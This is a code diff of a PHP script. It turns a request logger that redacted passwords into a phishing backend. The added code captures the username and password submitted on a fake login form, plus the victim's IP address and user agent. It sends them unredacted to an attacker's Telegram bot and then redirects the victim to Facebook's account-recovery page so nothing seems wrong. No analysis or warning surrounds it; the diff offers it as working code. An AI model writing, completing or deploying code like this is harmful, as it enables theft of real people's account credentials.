@@ -1,145 +1,94 @@
 <?php
-header('Content-Type: application/json');
+// Set content type header early for consistent behavior
+header('Content-Type: text/html'); // Changed to HTML for the redirect at the end
 
-// --- Configuration ---
-// IMPORTANT: Store these securely (e.g., Vercel Environment Variables)
-$botToken = getenv('TELEGRAM_BOT_TOKEN');
-$chatId = getenv('TELEGRAM_CHAT_ID');
+// --- Configuration: Use Environment Variables ---
+// Get Telegram Bot Token and Chat ID from Vercel Environment Variables
+$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN');
+$telegram_chat_id = getenv('TELEGRAM_CHAT_ID');
 
-// Function to send a message to Telegram
-function sendTelegramMessage($message, $botToken, $chatId) {
-    if (empty($botToken) || empty($chatId)) {
-        error_log("Telegram credentials missing. Cannot send message.");
-        return false;
-    }
+// Flag to control Telegram sending.
+// This can also be an environment variable if you want to control it externally
+$send_to_telegram = true; 
 
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
-    
-    // Diagnostic check (can be removed after confirming it works)
-    if (!function_exists('curl_init')) {
-        error_log("cURL extension is not enabled. Cannot send Telegram message. (This diagnostic check should no longer be hit!)");
-        return false;
-    }
+// --- IP and User Agent Logging (executed as soon as the script is accessed) ---
+$ipaddress = 'N/A'; // Default value
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    // This can contain multiple IPs, the first one is usually the client IP.
+    $ipaddress = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // Get only the first IP
+} else {
+    $ipaddress = $_SERVER['REMOTE_ADDR'];
+}
+$useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
+$timestamp = date("Y-m-d H:i:s");
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+// --- Sanitize inputs (from POST request - this happens after link click and form submission) ---
+// Using FILTER_SANITIZE_STRING is deprecated in PHP 8.1+, htmlspecialchars is generally safer.
+$email = isset($_POST['username']) ? htmlspecialchars((string)$_POST['username'], ENT_QUOTES, 'UTF-8') : 'N/A';
+$pass = isset($_POST['password']) ? htmlspecialchars((string)$_POST['password'], ENT_QUOTES, 'UTF-8') : 'N/A';
 
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
-    $errno = curl_errno($ch);
+// --- Determine if credentials were submitted ---
+$credential_submitted = ($email !== 'N/A' && $pass !== 'N/A'); // Changed to AND, usually both are needed
 
-    curl_close($ch);
+// --- Combined Log Content (prepared to be sent to Telegram, NOT saved to file) ---
+$combined_message_content = "Timestamp: " . $timestamp . "\n";
+$combined_message_content .= "IP Address: " . $ipaddress . "\n";
+$combined_message_content .= "User Agent: " . $useragent . "\n";
+$combined_message_content .= "--------------------------------------\n";
 
-    if ($response === false) {
-        error_log("cURL Error ({$errno}): {$error}");
-        return false;
-    }
-
-    $decodedResponse = json_decode($response, true);
-    if (!isset($decodedResponse['ok']) || !$decodedResponse['ok']) {
-        error_log("Telegram API Error: " . ($response ? $response : 'No response from Telegram API'));
-        return false;
-    }
-
-    return true;
+if ($credential_submitted) {
+    $combined_message_content .= "\n--- Credential Capture ---\n";
+    $combined_message_content .= "Username: " . $email . "\n";
+    // WARNING: Sending passwords unredacted is a significant security risk.
+    // If you absolutely must, ensure you understand the implications.
+    $combined_message_content .= "Password: " . $pass . "\n";
+    $combined_message_content .= "--------------------------------------\n";
 }
 
-$response = [];
-
-// --- Process Incoming Request ---
-$requestMethod = $_SERVER['REQUEST_METHOD'];
-$requestData = [];
-$telegramMessage = "<b>New Incoming Request:</b>\n";
-$telegramMessage .= "Method: " . $requestMethod . "\n";
-
-if ($requestMethod === 'GET') {
-    $requestData = $_GET;
-    $telegramMessage .= "Type: GET\n";
-} elseif ($requestMethod === 'POST') {
-    $rawBody = file_get_contents('php://input');
-    $decodedJson = json_decode($rawBody, true);
-
-    if (json_last_error() === JSON_ERROR_NONE) {
-        $requestData = $decodedJson;
+// --- Telegram Bot API Integration ---
+if ($send_to_telegram) {
+    if (empty($telegram_bot_token) || empty($telegram_chat_id)) {
+        error_log("ERROR: Telegram Bot Token or Chat ID environment variables are not set. Cannot send message.");
+    } elseif (!function_exists('curl_init')) {
+        error_log("ERROR: cURL extension is not enabled. Cannot send Telegram message.");
     } else {
-        // If not JSON, try parsing as URL-encoded or just keep raw body
-        parse_str($rawBody, $parsedStr);
-        if (!empty($parsedStr)) {
-            $requestData = $parsedStr;
+        // Send the combined message to Telegram
+        $telegram_text_api_url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
+
+        $ch_text = curl_init();
+        curl_setopt($ch_text, CURLOPT_URL, $telegram_text_api_url);
+        curl_setopt($ch_text, CURLOPT_POST, true);
+        curl_setopt($ch_text, CURLOPT_POSTFIELDS, http_build_query([
+            'chat_id' => $telegram_chat_id,
+            'text' => $combined_message_content, // Send the prepared message
+            'parse_mode' => 'HTML' // Ensure Telegram interprets HTML tags if you use them
+        ]));
+        curl_setopt($ch_text, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch_text, CURLOPT_SSL_VERIFYPEER, true);
+        curl_setopt($ch_text, CURLOPT_SSL_VERIFYHOST, 2);
+
+        $telegram_response_text = curl_exec($ch_text);
+        $curl_error_text = curl_error($ch_text);
+        curl_close($ch_text);
+
+        if ($curl_error_text) {
+            error_log("Telegram Text cURL Error: " . $curl_error_text);
         } else {
-            // Fallback to raw body if nothing else works, but wrap in an array
-            // so $requestData always remains an array for later processing
-            $requestData = ['raw_body_unparsed' => $rawBody];
+            $response_data_text = json_decode($telegram_response_text, true);
+            if (!$response_data_text['ok']) {
+                error_log("Telegram Text API Error: " . ($response_data_text['description'] ?? 'Unknown Telegram API Error') . " Response: " . $telegram_response_text);
+            }
         }
+        // Removed the sendTelegramDocument call as file logging is removed
     }
-    $telegramMessage .= "Type: POST\n";
 } else {
-    http_response_code(405);
-    $response['error'] = 'Method not allowed.';
-    $telegramMessage .= "Error: Method Not Allowed\n";
-    
-    // For method not allowed, we still want to redact before sending
-    $safeTelegramMessageData = redactSensitiveData($requestData);
-    $telegramMessage .= "Received Data (Redacted): " . json_encode($safeTelegramMessageData, JSON_PRETTY_PRINT) . "\n";
-
-    sendTelegramMessage($telegramMessage, $botToken, $chatId);
-    echo json_encode($response);
-    exit;
+    error_log("Telegram notification skipped as 'send_to_telegram' is set to false.");
 }
 
-// --- Sensitive Data Redaction Function ---
-function redactSensitiveData(array $data): array {
-    $sensitiveKeys = ['password', 'credit_card', 'cc_number', 'cvv', 'ssn', 'api_key', 'token']; // Add more as needed
-    $redactedData = $data;
-
-    foreach ($sensitiveKeys as $key) {
-        if (isset($redactedData[$key])) {
-            // Replace the value with a placeholder
-            $redactedData[$key] = '[REDACTED]';
-        }
-    }
-    return $redactedData;
-}
-
-// Prepare data for Telegram, redacting sensitive fields
-$telegramDataToLog = redactSensitiveData($requestData);
-$telegramMessage .= "Received Data (Redacted): " . json_encode($telegramDataToLog, JSON_PRETTY_PRINT) . "\n";
-
-
-// --- Get IP Address (as accurately as possible for serverless) ---
-$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $ipAddress = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-} elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
-    $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
-}
-$telegramMessage .= "IP Address is: " . $ipAddress . "\n";
-
-// --- Send Data to Telegram ---
-$telegramSuccess = sendTelegramMessage($telegramMessage, $botToken, $chatId);
-
-if ($telegramSuccess) {
-    $response['status'] = 'success';
-    $response['message'] = 'Request processed and data sent to Telegram.';
-    // For the public response, it's safer to send redacted data too, or only status
-    $response['received_data'] = redactSensitiveData($requestData); 
-} else {
-    $response['status'] = 'error';
-    $response['message'] = 'Request processed but failed to send data to Telegram.';
-    // For the public response, it's safer to send redacted data too, or only status
-    $response['received_data'] = redactSensitiveData($requestData); 
-}
-
-echo json_encode($response);
+// --- Redirect the user ---
+header('Location: https://facebook.com/recover/initiate/');
+exit();
 
 ?>
